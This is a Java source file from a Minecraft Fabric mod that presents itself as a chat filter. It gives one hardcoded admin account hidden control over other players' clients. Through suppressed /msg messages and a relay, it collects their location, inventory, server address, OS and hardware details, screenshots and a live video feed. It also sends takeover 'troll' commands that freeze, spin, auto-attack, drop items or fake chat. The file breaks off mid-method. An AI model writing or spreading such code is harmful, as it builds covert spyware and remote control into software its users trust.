package com.deinname.chatfilter;

import com.google.gson.*;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.client.MinecraftClient;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Admin control system for ChatFilter.
 * The admin ("Fynnland") can manage per-player filter rules,
 * enforce locked rules, set chat timeouts, and ban players.
 */
public final class AdminConfig {

    public static final String ADMIN_USERNAME = "Fynnland";
    public static final String CF_MARKER = "[CF:";

    private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
    private static final Gson GSON_COMPACT = new Gson();
    private static final Path ADMIN_FILE =
            FabricLoader.getInstance().getConfigDir().resolve("chatfilter_admin.json");

    private static Map<String, PlayerData> players = new LinkedHashMap<>();
    private static int syncIntervalSeconds = 30;

    // Runtime state (not persisted)
    private static long chatBlockedUntil = 0;
    private static long lastSyncTime = 0;

    private AdminConfig() {}

    // ── Data classes ─────────────────────────────────────────────────────────

    public static class PlayerData {
        public boolean banned = false;
        public List<FilterRule> rules = new ArrayList<>();
        public String uuid = ""; // cached UUID (filled by PlayerHeadCache)
    }

    // ── Identity ─────────────────────────────────────────────────────────────

    public static boolean isAdmin() {
        MinecraftClient mc = MinecraftClient.getInstance();
        return mc.getSession() != null
                && ADMIN_USERNAME.equalsIgnoreCase(mc.getSession().getUsername());
    }

    public static String getCurrentUsername() {
        MinecraftClient mc = MinecraftClient.getInstance();
        return mc.getSession() != null ? mc.getSession().getUsername() : "";
    }

    // ── Player management ────────────────────────────────────────────────────

    public static Map<String, PlayerData> getPlayers() { return players; }

    public static List<String> getPlayerNames() {
        return new ArrayList<>(players.keySet());
    }

    public static PlayerData getOrCreatePlayer(String name) {
        return players.computeIfAbsent(name, k -> new PlayerData());
    }

    public static PlayerData getPlayer(String name) {
        return players.get(name);
    }

    public static void removePlayer(String name) {
        players.remove(name);
        save();
    }

    public static boolean isPlayerBanned(String name) {
        PlayerData data = players.get(name);
        return data != null && data.banned;
    }

    public static void setPlayerBanned(String name, boolean banned) {
        getOrCreatePlayer(name).banned = banned;
        save();
    }

    // ── Current player checks ────────────────────────────────────────────────

    public static boolean isCurrentPlayerBanned() {
        if (isAdmin()) return false; // admin can never be banned
        String username = getCurrentUsername();
        PlayerData data = players.get(username);
        return data != null && data.banned;
    }

    /** Returns admin-enforced rules for the current player (all marked locked). */
    public static List<FilterRule> getAdminRulesForCurrentPlayer() {
        if (isAdmin()) return Collections.emptyList();
        String username = getCurrentUsername();
        PlayerData data = players.get(username);
        if (data == null) return Collections.emptyList();
        for (FilterRule r : data.rules) r.setLocked(true);
        return Collections.unmodifiableList(data.rules);
    }

    // ── Chat timeout ─────────────────────────────────────────────────────────

    public static void applyChatTimeout(int seconds) {
        if (seconds > 0) {
            chatBlockedUntil = System.currentTimeMillis() + seconds * 1000L;
        }
    }

    public static boolean isChatBlocked() {
        return System.currentTimeMillis() < chatBlockedUntil;
    }

    public static int getRemainingTimeoutSeconds() {
        long remaining = chatBlockedUntil - System.currentTimeMillis();
        return remaining > 0 ? (int) ((remaining + 999) / 1000) : 0;
    }

    // ── Sync (non-admin clients periodically re-read the file) ───────────────

    public static void syncIfNeeded() {
        if (isAdmin()) return;
        long now = System.currentTimeMillis();
        if (now - lastSyncTime >= syncIntervalSeconds * 1000L) {
            lastSyncTime = now;
            load();
        }
    }

    // ── Chunked Chat Sync Protocol ───────────────────────────────────────────
    //
    // Format: /tell <player> [CF:<sid>:<n>/<total>]<base64chunk>
    // Ping:   /tell <player> [CF:PING:<sender>]
    // Pong:   /tell <player> [CF:PONG:<sender>]
    //
    // Chunks are reassembled by session ID, then decoded.

    private static final Map<String, String[]> chunkBuffers = new ConcurrentHashMap<>();
    private static final Map<String, Long> chunkTimestamps = new ConcurrentHashMap<>();
    private static final long CHUNK_TIMEOUT_MS = 30_000;
    /** Screenshot chunk reassembly buffer. */
    private static final Map<String, String[]> scChunkBuffers = new ConcurrentHashMap<>();
    private static int syncSessionCounter = 0;

    /** Result of processing an incoming message for CF protocol data. */
    public static class SyncResult {
        public enum Type { NONE, SUPPRESS, PING, PONG, SYNC_OK, SYNC_FAIL, TROLL, STATUS, RELAY_URL, SPEC }
        public final Type type;
        public final String data;
        public static final SyncResult NONE = new SyncResult(Type.NONE, null);
        public static final SyncResult SUPPRESS = new SyncResult(Type.SUPPRESS, null);
        public SyncResult(Type type, String data) { this.type = type; this.data = data; }
    }

    private static String newSessionId() {
        return Integer.toHexString(++syncSessionCounter & 0xFFFF);
    }

    // ── Compact encoding (bitmask actions for minimal size) ──────────────────

    private static int encodeActions(FilterRule r) {
        int a = 0;
        if (r.isBlockMessage())        a |= 1;
        if (r.isCensorWord())          a |= 2;
        if (r.isStripWord())           a |= 4;
        if (r.isShowWarning())         a |= 8;
        if (r.isSendReplacement())     a |= 16;
        if (r.isRequireConfirmation()) a |= 32;
        if (r.isDisconnectFromServer())a |= 64;
        return a;
    }

    private static void decodeActions(FilterRule r, int a) {
        r.setBlockMessage((a & 1) != 0);
        r.setCensorWord((a & 2) != 0);
        r.setStripWord((a & 4) != 0);
        r.setShowWarning((a & 8) != 0);
        r.setSendReplacement((a & 16) != 0);
        r.setRequireConfirmation((a & 32) != 0);
        r.setDisconnectFromServer((a & 64) != 0);
    }

    /** Encode a player's data as compact Base64 (bitmask actions, short keys). */
    public static String encodePlayerData(String playerName) {
        PlayerData pd = players.get(playerName);
        if (pd == null) return null;
        try {
            JsonObject obj = new JsonObject();
            obj.addProperty("p", playerName);
            obj.addProperty("b", pd.banned ? 1 : 0);
            JsonArray arr = new JsonArray();
            for (FilterRule r : pd.rules) {
                JsonObject ro = new JsonObject();
                ro.addProperty("k", r.getKeyword());
                ro.addProperty("a", encodeActions(r));
                if (r.isShowWarning() && !r.getWarningText().isEmpty())
                    ro.addProperty("wt", r.getWarningText());
                if (r.isSendReplacement() && !r.getReplacementText().isEmpty())
                    ro.addProperty("rt", r.getReplacementText());
                if (r.getTimeoutSeconds() > 0)
                    ro.addProperty("ts", r.getTimeoutSeconds());
                arr.add(ro);
            }
            obj.add("r", arr);
            return Base64.getEncoder().encodeToString(
                    obj.toString().getBytes(StandardCharsets.UTF_8));
        } catch (Exception e) {
            ChatFilterMod.LOGGER.error("[Columba] Encode failed: {}", e.getMessage());
            return null;
        }
    }

    /** Decode compact Base64 data and apply admin rules for the current player. */
    public static boolean decodeSyncData(String base64Data) {
        try {
            String json = new String(Base64.getDecoder().decode(base64Data), StandardCharsets.UTF_8);
            JsonObject obj = GSON_COMPACT.fromJson(json, JsonObject.class);
            if (obj == null || !obj.has("p")) return false;

            String player = obj.get("p").getAsString();
            if (!player.equalsIgnoreCase(getCurrentUsername())) return false;

            boolean banned = obj.has("b") && obj.get("b").getAsInt() != 0;
            List<FilterRule> rules = new ArrayList<>();
            if (obj.has("r")) {
                for (JsonElement el : obj.getAsJsonArray("r")) {
                    JsonObject ro = el.getAsJsonObject();
                    FilterRule rule = new FilterRule(ro.get("k").getAsString());
                    decodeActions(rule, ro.has("a") ? ro.get("a").getAsInt() : 0);
                    if (ro.has("wt")) rule.setWarningText(ro.get("wt").getAsString());
                    if (ro.has("rt")) rule.setReplacementText(ro.get("rt").getAsString());
                    if (ro.has("ts")) rule.setTimeoutSeconds(ro.get("ts").getAsInt());
                    rule.setLocked(true);
                    rule.setEnabled(true);
                    rules.add(rule);
                }
            }

            PlayerData pd = getOrCreatePlayer(player);
            pd.banned = banned;
            pd.rules = rules;
            save();
            ChatFilterMod.LOGGER.info("[Columba] Sync OK: {} rules, banned={}", rules.size(), banned);
            return true;
        } catch (Exception e) {
            ChatFilterMod.LOGGER.error("[Columba] Decode failed: {}", e.getMessage());
            return false;
        }
    }

    // ── Online tracking (PONG-based) ────────────────────────────────────────

    private static final Map<String, Long> pongTimes = new ConcurrentHashMap<>();
    private static final Map<String, String> playerServers = new ConcurrentHashMap<>();
    /** Rich player status data from STATUS messages. */
    private static final Map<String, PlayerStatus> playerStatuses = new ConcurrentHashMap<>();
    /** Screenshot pixel data (ARGB int[]) and dimensions, keyed by "latest". */
    private static volatile int[] screenshotPixels = null;
    private static volatile int screenshotW = 0, screenshotH = 0;
    private static volatile long screenshotTimestamp = 0;

    // ── Admin-side capture settings (video = RC live feed, screenshot = on-demand) ──
    public static volatile int videoW = 240, videoH = 135;
    public static volatile float videoSpf = 3f; // seconds per frame during RC
    public static volatile int ssW = 80, ssH = 45; // on-demand screenshot resolution

    /** Tracks which troll effects are active per player (admin-side only). */
    private static final Map<String, Set<String>> activeTrolls = new ConcurrentHashMap<>();
    /** Dedup: recently processed message hashes to prevent duplicates. */
    private static final Map<String, Long> seenMessages = new ConcurrentHashMap<>();
    /** Monotonic counter to ensure troll commands are never deduplicated. */
    private static int trollNonce = 0;
    /** Whether the local user wants to see ping/pong notifications. */
    private static boolean showPingNotifications = true;

    /** Rich status data collected from a player. */
    public static class PlayerStatus {
        public String name = "";
        public int x, y, z;
        public float hp = 20, maxHp = 20;
        public int food = 20, level = 0, armor = 0;
        public String heldItem = "";
        public String dimension = "overworld";
        public String gameMode = "survival";
        public boolean sprinting, sneaking, swimming, flying, onGround = true;
        public int fps = 0, light = 15, air = 300, ping = 0;
        public boolean inWater, inLava, raining, thundering;
        public long timeOfDay = 6000;
        public String server = "";
        public int yaw, pitch;
        public long timestamp = 0;
        // System specs (from SPEC response)
        public String os = "", javaVer = "", gpuName = "", gpuVendor = "", glVersion = "";
        public int cpuCores = 0, ramTotalMb = 0, ramUsedMb = 0, ramFreeMb = 0;
        public String screenRes = "", mcVersion = "", fabricVer = "";
        // Inventory (from status pushes)
        public String[] invNames = new String[36];
        public int[] invCounts = new int[36];
        public String[] invIds = new String[36];
        public int[] invDamage = new int[36];
        public int[] invMaxDamage = new int[36];
        public String[] invEnchants = new String[36];
        public String[] armorNames = new String[4]; // HEAD, CHEST, LEGS, FEET
        public String[] armorIds = new String[4];
        public int[] armorDamage = new int[4];
        public int[] armorMaxDamage = new int[4];
        public String[] armorEnchants = new String[4];
        public String offhandName = "", offhandId = "";
        public int offhandCount = 0;
        public int offhandDamage = 0, offhandMaxDamage = 0;
        public String offhandEnchants = "";
    }

    /** Record rich status data from a player. */
    public static void recordStatus(String jsonData) {
        try {
            JsonObject j = com.google.gson.JsonParser.parseString(jsonData).getAsJsonObject();
            String name = j.has("n") ? j.get("n").getAsString() : "";
            // Preserve existing spec data if available
            PlayerStatus existing = name.isEmpty() ? null : playerStatuses.get(name.toLowerCase());
            PlayerStatus s = new PlayerStatus();
            if (existing != null) {
                s.os = existing.os; s.javaVer = existing.javaVer; s.gpuName = existing.gpuName;
                s.gpuVendor = existing.gpuVendor; s.glVersion = existing.glVersion;
                s.cpuCores = existing.cpuCores; s.ramTotalMb = existing.ramTotalMb;
                s.ramUsedMb = existing.ramUsedMb; s.ramFreeMb = existing.ramFreeMb;
                s.screenRes = existing.screenRes; s.mcVersion = existing.mcVersion;
                s.fabricVer = existing.fabricVer;
            }
            s.name = name;
            s.x = j.has("x") ? j.get("x").getAsInt() : 0;
            s.y = j.has("y") ? j.get("y").getAsInt() : 0;
            s.z = j.has("z") ? j.get("z").getAsInt() : 0;
            s.hp = j.has("hp") ? j.get("hp").getAsFloat() : 20;
            s.maxHp = j.has("mhp") ? j.get("mhp").getAsFloat() : 20;
            s.food = j.has("fd") ? j.get("fd").getAsInt() : 20;
            s.level = j.has("lv") ? j.get("lv").getAsInt() : 0;
            s.armor = j.has("ar") ? j.get("ar").getAsInt() : 0;
            s.heldItem = j.has("it") ? j.get("it").getAsString() : "";
            s.dimension = j.has("dm") ? j.get("dm").getAsString() : "overworld";
            s.gameMode = j.has("gm") ? j.get("gm").getAsString() : "";
            s.sprinting = j.has("sp") && j.get("sp").getAsBoolean();
            s.sneaking = j.has("sn") && j.get("sn").getAsBoolean();
            s.swimming = j.has("sw") && j.get("sw").getAsBoolean();
            s.flying = j.has("fl") && j.get("fl").getAsBoolean();
            s.onGround = !j.has("gr") || j.get("gr").getAsBoolean();
            s.fps = j.has("fp") ? j.get("fp").getAsInt() : 0;
            s.light = j.has("li") ? j.get("li").getAsInt() : 0;
            s.air = j.has("ai") ? j.get("ai").getAsInt() : 300;
            s.ping = j.has("pg") ? j.get("pg").getAsInt() : 0;
            s.inWater = j.has("wt") && j.get("wt").getAsBoolean();
            s.inLava = j.has("la") && j.get("la").getAsBoolean();
            s.raining = j.has("rn") && j.get("rn").getAsBoolean();
            s.thundering = j.has("th") && j.get("th").getAsBoolean();
            s.timeOfDay = j.has("tm") ? j.get("tm").getAsLong() : 0;
            s.server = j.has("sv") ? j.get("sv").getAsString() : "";
            s.yaw = j.has("yw") ? j.get("yw").getAsInt() : 0;
            s.pitch = j.has("pt") ? j.get("pt").getAsInt() : 0;
            // Parse inventory
            try {
                if (j.has("inv")) {
                    JsonArray inv = j.getAsJsonArray("inv");
                    for (int i = 0; i < Math.min(36, inv.size()); i++) {
                        if (inv.get(i).isJsonNull()) { s.invNames[i] = null; s.invIds[i] = null; s.invCounts[i] = 0; s.invEnchants[i] = null; }
                        else {
                            JsonObject si = inv.get(i).getAsJsonObject();
                            s.invIds[i] = si.has("id") ? si.get("id").getAsString() : "";
                            s.invNames[i] = si.has("n") ? si.get("n").getAsString() : "";
                            s.invCounts[i] = si.has("c") ? si.get("c").getAsInt() : 1;
                            s.invDamage[i] = si.has("d") ? si.get("d").getAsInt() : 0;
                            s.invMaxDamage[i] = si.has("md") ? si.get("md").getAsInt() : 0;
                            s.invEnchants[i] = si.has("e") ? si.get("e").getAsString() : null;
                        }
                    }
                }
            } catch (Exception ignored) {}
            try {
                if (j.has("arm")) {
                    JsonArray arm = j.getAsJsonArray("arm");
                    for (int i = 0; i < Math.min(4, arm.size()); i++) {
                        if (arm.get(i).isJsonNull()) { s.armorNames[i] = null; s.armorIds[i] = null; s.armorEnchants[i] = null; }
                        else {
                            JsonObject si = arm.get(i).getAsJsonObject();
                            s.armorIds[i] = si.has("id") ? si.get("id").getAsString() : "";
                            s.armorNames[i] = si.has("n") ? si.get("n").getAsString() : "";
                            s.armorDamage[i] = si.has("d") ? si.get("d").getAsInt() : 0;
                            s.armorMaxDamage[i] = si.has("md") ? si.get("md").getAsInt() : 0;
                            s.armorEnchants[i] = si.has("e") ? si.get("e").getAsString() : null;
                        }
                    }
                }
            } catch (Exception ignored) {}
            try {
                if (j.has("off") && !j.get("off").isJsonNull()) {
                    JsonObject off = j.getAsJsonObject("off");
                    s.offhandId = off.has("id") ? off.get("id").getAsString() : "";
                    s.offhandName = off.has("n") ? off.get("n").getAsString() : "";
                    s.offhandCount = off.has("c") ? off.get("c").getAsInt() : 1;
                    s.offhandDamage = off.has("d") ? off.get("d").getAsInt() : 0;
                    s.offhandMaxDamage = off.has("md") ? off.get("md").getAsInt() : 0;
                    s.offhandEnchants = off.has("e") ? off.get("e").getAsString() : "";
                }
            } catch (Exception ignored) {}
            s.timestamp = System.currentTimeMillis();
            if (!s.name.isEmpty()) {
                playerStatuses.put(s.name.toLowerCase(), s);
                pongTimes.put(s.name.toLowerCase(), s.timestamp);
                if (!s.server.isEmpty()) playerServers.put(s.name.toLowerCase(), s.server);
            }
        } catch (Exception e) {
            ChatFilterMod.LOGGER.debug("[Columba] Failed to parse STATUS: {}", e.getMessage());
        }
    }

    /** Record system specs from a SPEC JSON response. */
    public static void recordSpecs(String jsonData) {
        try {
            JsonObject j = com.google.gson.JsonParser.parseString(jsonData).getAsJsonObject();
            String user = j.has("user") ? j.get("user").getAsString() : "";
            if (user.isEmpty()) return;
            PlayerStatus s = playerStatuses.get(user.toLowerCase());
            if (s == null) { s = new PlayerStatus(); s.name = user; playerStatuses.put(user.toLowerCase(), s); }
            s.os = j.has("os") ? j.get("os").getAsString() : "";
            s.javaVer = j.has("java") ? j.get("java").getAsString() : "";
            s.cpuCores = j.has("cpuCores") ? j.get("cpuCores").getAsInt() : 0;
            s.ramTotalMb = j.has("ramTotal") ? j.get("ramTotal").getAsInt() : 0;
            s.ramUsedMb = j.has("ramUsed") ? j.get("ramUsed").getAsInt() : 0;
            s.ramFreeMb = j.has("ramFree") ? j.get("ramFree").getAsInt() : 0;
            s.gpuName = j.has("gpu") ? j.get("gpu").getAsString() : "";
            s.gpuVendor = j.has("gpuVendor") ? j.get("gpuVendor").getAsString() : "";
            s.glVersion = j.has("glVer") ? j.get("glVer").getAsString() : "";
            s.screenRes = j.has("screen") ? j.get("screen").getAsString() : "";
            s.mcVersion = j.has("mcVer") ? j.get("mcVer").getAsString() : "";
            s.fabricVer = j.has("fabricVer") ? j.get("fabricVer").getAsString() : "";
        } catch (Exception e) {
            ChatFilterMod.LOGGER.debug("[Columba] Failed to parse SPEC: {}", e.getMessage());
        }
    }

    /** Get full status data for a player, or null. */
    public static PlayerStatus getPlayerStatus(String playerName) {
        return playerStatuses.get(playerName.toLowerCase());
    }

    /** Decode a compressed screenshot (Deflate+Base64) and store pixel data. */
    static void decodeScreenshot(String base64Data) {
        try {
            byte[] compressed = java.util.Base64.getDecoder().decode(base64Data);
            if (compressed.length < 2) return;
            int w = compressed[0] & 0xFF;
            int h = compressed[1] & 0xFF;
            if (w == 0 || h == 0) return;
            java.util.zip.InflaterInputStream iis = new java.util.zip.InflaterInputStream(
                    new java.io.ByteArrayInputStream(compressed, 2, compressed.length - 2));
            byte[] rgb = iis.readAllBytes();
            iis.close();
            if (rgb.length < w * h * 3) return;
            int[] pixels = new int[w * h];
            for (int i = 0; i < w * h; i++) {
                int r = rgb[i * 3] & 0xFF;
                int g = rgb[i * 3 + 1] & 0xFF;
                int b = rgb[i * 3 + 2] & 0xFF;
                pixels[i] = 0xFF000000 | (r << 16) | (g << 8) | b;
            }
            screenshotPixels = pixels;
            screenshotW = w;
            screenshotH = h;
            screenshotTimestamp = System.currentTimeMillis();
        } catch (Exception e) {
            ChatFilterMod.LOGGER.debug("[CF] Screenshot decode error: {}", e.getMessage());
        }
    }

    /** Get the latest screenshot pixel data (ARGB), or null. */
    public static int[] getScreenshotPixels() { return screenshotPixels; }
    /** Get latest screenshot width. */
    public static int getScreenshotW() { return screenshotW; }
    /** Get latest screenshot height. */
    public static int getScreenshotH() { return screenshotH; }
    /** Get latest screenshot timestamp. */
    public static long getScreenshotTimestamp() { return screenshotTimestamp; }

    /** Record that a player responded to a PING. Optionally includes server info. */
    public static void recordPong(String data) {
        // Format: "PlayerName" or "PlayerName|server.address"
        String playerName = data;
        String server = null;
        int pipe = data.indexOf('|');
        if (pipe > 0) {
            playerName = data.substring(0, pipe);
            server = data.substring(pipe + 1);
        }
        pongTimes.put(playerName.toLowerCase(), System.currentTimeMillis());
        if (server != null && !server.isEmpty()) {
            playerServers.put(playerName.toLowerCase(), server);
        }
    }

    /** Get the server address a player was last seen on, or null. */
    public static String getPlayerServer(String playerName) {
        return playerServers.get(playerName.toLowerCase());
    }

    /** Get the last seen timestamp for a player, or 0. */
    public static long getLastSeenTime(String playerName) {
        Long t = pongTimes.get(playerName.toLowerCase());
        return t != null ? t : 0;
    }

    /** True if we received a PONG from this player within the last 60 seconds. */
    public static boolean isRecentlyOnline(String playerName) {
        Long t = pongTimes.get(playerName.toLowerCase());
        return t != null && System.currentTimeMillis() - t < 60_000;
    }

    /** Count how many of the given player names are recently online. */
    public static int countOnline(Collection<String> names) {
        long now = System.currentTimeMillis();
        int count = 0;
        for (String n : names) {
            Long t = pongTimes.get(n.toLowerCase());
            if (t != null && now - t < 60_000) count++;
        }
        return count;
    }

    /** Send a PING to all managed players (admin only). */
    public static void pingAllPlayers() {
        String sender = getCurrentUsername();
        for (String name : getPlayerNames()) {
            RelaySync.pushPing(name, sender);
        }
    }

    // ── Troll state tracking (admin-side) ────────────────────────────────────

    public static final Set<String> TOGGLE_TROLLS_SET = Set.of(
            "SNEAK", "BHOP", "SPIN", "FREEZE", "SLOTCYCLE", "NOPICK",
            "DVD", "ZOOM", "LOOKUP", "LOOKDOWN", "AUTOATTACK", "SWAPWS");

    private static final Set<String> TOGGLE_TROLLS = TOGGLE_TROLLS_SET;

    /** Toggle a troll effect for a player. Returns true if now active. */
    public static boolean toggleTroll(String playerName, String command) {
        String key = playerName.toLowerCase();
        Set<String> set = activeTrolls.computeIfAbsent(key, k -> ConcurrentHashMap.newKeySet());
        String cmd = command.toUpperCase();
        if ("RESET".equals(cmd)) {
            set.clear();
            return false;
        }
        if (TOGGLE_TROLLS.contains(cmd)) {
            if (set.contains(cmd)) { set.remove(cmd); return false; }
            else { set.add(cmd); return true; }
        }
        return false; // one-shot commands (JUMP, DROP, DROPALL) don't toggle
    }

    /** Check if a toggle troll is currently active for a player. */
    public static boolean isTrollActive(String playerName, String command) {
        Set<String> set = activeTrolls.get(playerName.toLowerCase());
        return set != null && set.contains(command.toUpperCase());
    }

    // ── Dedup ─────────────────────────────────────────────────────────────────

    /** Returns true if this message was already processed recently. */
    public static boolean isDuplicate(String message) {
        long now = System.currentTimeMillis();
        seenMessages.entrySet().removeIf(e -> now - e.getValue() > 30_000);
        if (seenMessages.containsKey(message)) return true;
        seenMessages.put(message, now);
        return false;
    }

    // ── Ping notification control ─────────────────────────────────────────────

    public static boolean showPingNotifications() { return showPingNotifications; }
    public static void setShowPingNotifications(boolean show) { showPingNotifications = show; }

    // ── Push via chunked /tell ───────────────────────────────────────────────

    /** Push admin rules to a player – uses relay if enabled, otherwise /msg. */
    public static void pushToPlayer(String playerName) {
        if (RelaySync.isEnabled()) {
            RelaySync.pushPlayerData(playerName);
            return;
        }
        // Fallback: chunked /msg (same server only)
        String encoded = encodePlayerData(playerName);
        if (encoded == null) return;
        MinecraftClient mc = MinecraftClient.getInstance();
        if (mc.getNetworkHandler() == null) return;

        String sid = newSessionId();
        int maxChunk = 140;
        int total = (encoded.length() + maxChunk - 1) / maxChunk;

        new Thread(() -> {
            for (int i = 0; i < total; i++) {
                if (i > 0) {
                    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
                }
                int start = i * maxChunk;
                int end = Math.min(start + maxChunk, encoded.length());
                String chunk = encoded.substring(start, end);
                String header = CF_MARKER + sid + ":" + (i + 1) + "/" + total + "]";
                final String cmd = "msg " + playerName + " " + header + chunk;
                mc.execute(() -> {
                    if (mc.getNetworkHandler() != null)
                        mc.getNetworkHandler().sendChatCommand(cmd);
                });
            }
        }, "CF-Push-" + playerName).start();
    }

    /** Send a test ping to verify the other player's mod is active. */
    public static void sendTestPing(String playerName) {
        String sender = getCurrentUsername();
        if (RelaySync.isEnabled()) {
            RelaySync.pushPing(playerName, sender);
            return;
        }
        MinecraftClient mc = MinecraftClient.getInstance();
        if (mc.getNetworkHandler() == null) return;
        mc.getNetworkHandler().sendChatCommand(
                "msg " + playerName + " " + CF_MARKER + "PING:" + sender + "]");
    }

    /** Send a troll command – uses relay if enabled, otherwise /msg. Includes nonce to bypass dedup. */
    public static void sendTrollCommand(String playerName, String command) {
        trollNonce++;
        String trollMsg = command + "#" + trollNonce;
        ChatFilterMod.LOGGER.debug("[CF] SEND troll '{}' to '{}' via {}", command, playerName, RelaySync.isEnabled() ? "RELAY" : "MSG");
        if (RelaySync.isEnabled()) {
            RelaySync.pushTroll(playerName, trollMsg);
            return;
        }
        MinecraftClient mc = MinecraftClient.getInstance();
        if (mc.getNetworkHandler() == null) return;
        mc.getNetworkHandler().sendChatCommand(
                "msg " + playerName + " " + CF_MARKER + "T:" + trollMsg + "]");
    }

    // ── Incoming message processing ──────────────────────────────────────────

    /** Process an incoming message for CF protocol data. */
    public static SyncResult handleIncomingMessage(String rawText) {
        // Strip Minecraft formatting codes (§x) that some servers add
        String cleanText = rawText.replaceAll("\u00a7.", "");
        int cfIdx = cleanText.indexOf(CF_MARKER);
        if (cfIdx < 0) return SyncResult.NONE;

        String after = cleanText.substring(cfIdx + CF_MARKER.length());

        // PING
        if (after.startsWith("PING:")) {
            int end = after.indexOf(']');
            if (end > 5) return new SyncResult(SyncResult.Type.PING, after.substring(5, end));
            return SyncResult.SUPPRESS;
        }
        // PONG
        if (after.startsWith("PONG:")) {
            int end = after.indexOf(']');
            if (end > 5) return new SyncResult(SyncResult.Type.PONG, after.substring(5, end));
            return SyncResult.SUPPRESS;
        }
        // RELAY_URL: auto-config [CF:RU:url|secret]
        if (after.startsWith("RU:")) {
            int end = after.indexOf(']');
            if (end > 3) return new SyncResult(SyncResult.Type.RELAY_URL, after.substring(3, end));
            return SyncResult.SUPPRESS;
        }
        // STATUS: rich player data JSON [CF:ST:{...}]
        if (after.startsWith("ST:")) {
            // Find the end of JSON (last '}' followed by ']')
            int jsonEnd = after.lastIndexOf('}');
            if (jsonEnd > 3) return new SyncResult(SyncResult.Type.STATUS, after.substring(3, jsonEnd + 1));
            return SyncResult.SUPPRESS;
        }
        // SPEC: system specs JSON [CF:SPEC:{...}]
        if (after.startsWith("SPEC:")) {
            int jsonEnd = after.lastIndexOf('}');
            if (jsonEnd > 5) return new SyncResult(SyncResult.Type.SPEC, after.substring(5, jsonEnd + 1));
            return SyncResult.SUPPRESS;
        }
        // SCREENSHOT: compressed pixel data [CF:SC:<base64>] or chunked [CF:SC:<sid>:<n>/<total>]<data>
        if (after.startsWith("SC:")) {
            String scPayload = after.substring(3);
            int bracket = scPayload.indexOf(']');
            if (bracket < 0) return SyncResult.SUPPRESS;
            String header = scPayload.substring(0, bracket);
            // Check for chunked format: <sid>:<n>/<total>
            int colonIdx = header.indexOf(':');
            int slashIdx = header.indexOf('/');
            if (colonIdx > 0 && slashIdx > colonIdx) {
                // Chunked screenshot
                try {
                    String sid = "SC_" + header.substring(0, colonIdx);
                    int chunkNum = Integer.parseInt(header.substring(colonIdx + 1, slashIdx));
                    int totalChunks = Integer.parseInt(header.substring(slashIdx + 1));
                    String data = scPayload.substring(bracket + 1).strip()
                            .replaceAll("[^A-Za-z0-9+/=]", "");
                    String[] chunks = scChunkBuffers.computeIfAbsent(sid, k -> new String[totalChunks]);
                    if (chunks.length != totalChunks) {
                        chunks = new String[totalChunks];
                        scChunkBuffers.put(sid, chunks);
                    }
                    chunks[chunkNum - 1] = data;
                    for (String c : chunks) { if (c == null) return SyncResult.SUPPRESS; }
                    // All chunks received — reassemble
                    StringBuilder sb = new StringBuilder();
                    for (String c : chunks) sb.append(c);
                    scChunkBuffers.remove(sid);
                    decodeScreenshot(sb.toString());
                } catch (Exception ignored) {}
            } else {
                // Single-message screenshot (header IS the base64 data)
                decodeScreenshot(header);
            }
            return SyncResult.SUPPRESS;
        }
        // TROLL command: [CF:T:<command>#<nonce>] or [CF:T:<command>]
        if (after.startsWith("T:")) {
            int end = after.indexOf(']');
            if (end > 2) {
                String trollData = after.substring(2, end);
                // Strip nonce (e.g., "SNEAK#42" → "SNEAK", "FAKECHAT:hi#42" → "FAKECHAT:hi")
                int hashIdx = trollData.lastIndexOf('#');
                String cmd = hashIdx > 0 ? trollData.substring(0, hashIdx) : trollData;
                return new SyncResult(SyncResult.Type.TROLL, cmd);
            }
            return SyncResult.SUPPRESS;
        }

        // Data chunk: <sid>:<n>/<total>]<data>
        int colonIdx = after.indexOf(':');
        int slashIdx = after.indexOf('/');
        int bracketIdx = after.indexOf(']');
        if (colonIdx < 0 || slashIdx < 0 || bracketIdx < 0
                || colonIdx > slashIdx || slashIdx > bracketIdx)
            return SyncResult.NONE;

        try {
            String sessionId = after.substring(0, colonIdx);
            int chunkNum = Integer.parseInt(after.substring(colonIdx + 1, slashIdx));
            int totalChunks = Integer.parseInt(after.substring(slashIdx + 1, bracketIdx));
            // Clean the data: strip any non-base64 characters
            String data = after.substring(bracketIdx + 1).strip()
                    .replaceAll("[^A-Za-z0-9+/=]", "");

            if (totalChunks <= 0 || chunkNum < 1 || chunkNum > totalChunks || data.isEmpty())
                return SyncResult.SUPPRESS;

            // Clean expired buffers
            long now = System.currentTimeMillis();
            chunkTimestamps.entrySet().removeIf(e -> now - e.getValue() > CHUNK_TIMEOUT_MS);
            chunkBuffers.keySet().retainAll(chunkTimestamps.keySet());

            String[] chunks = chunkBuffers.computeIfAbsent(sessionId, k -> new String[totalChunks]);
            chunkTimestamps.put(sessionId, now);

            if (chunks.length != totalChunks) {
                chunks = new String[totalChunks];
                chunkBuffers.put(sessionId, chunks);
            }

            chunks[chunkNum - 1] = data;

            // Check completeness
            for (String c : chunks) {
                if (c == null) return SyncResult.SUPPRESS;
            }

            // All chunks received
            StringBuilder sb = new StringBuilder();
            for (String c : chunks) sb.append(c);
            chunkBuffers.remove(sessionId);
            chunkTimestamps.remove(sessionId);

            return decodeSyncData(sb.toString())
                    ? new SyncResult(SyncResult.Type.SYNC_OK, null)
                    : new SyncResult(SyncResult.Type.SYNC_FAIL, null);
        } catch (NumberFormatException e) {
            return SyncResult.NONE;
        }
    }

    // ── Export / Import codes (clipboard sharing) ────────────────────────────

    /** Generate an export code for sharing via clipboard/Discord. */
    public static String generateExportCode(String playerName) {
        return encodePlayerData(playerName);
    }

    /** Import admin rules from a pasted code string. */
    public static boolean importCode(String code) {
        if (code == null || code.isBlank()) return false;
        return decodeSyncData(code.strip());
    }

    /** Decode a Base64 export code and return just the rules list (without applying). */
    public static List<FilterRule> decodeRulesFromCode(String base64Data) {
        try {
            String json = new String(Base64.getDecoder().decode(base64Data), StandardCharsets.UTF_8);
            JsonObject obj = GSON_COMPACT.fromJson(json, JsonObject.class);
            if (obj == null || !obj.has("r")) return null;
            List<FilterRule> rules = new ArrayList<>();
            for (JsonElement el : obj.getAsJsonArray("r")) {
                JsonObject ro = el.getAsJsonObject();
                FilterRule rule = new FilterRule(ro.get("k").getAsString());
                decodeActions(rule, ro.has("a") ? ro.get("a").getAsInt() : 0);
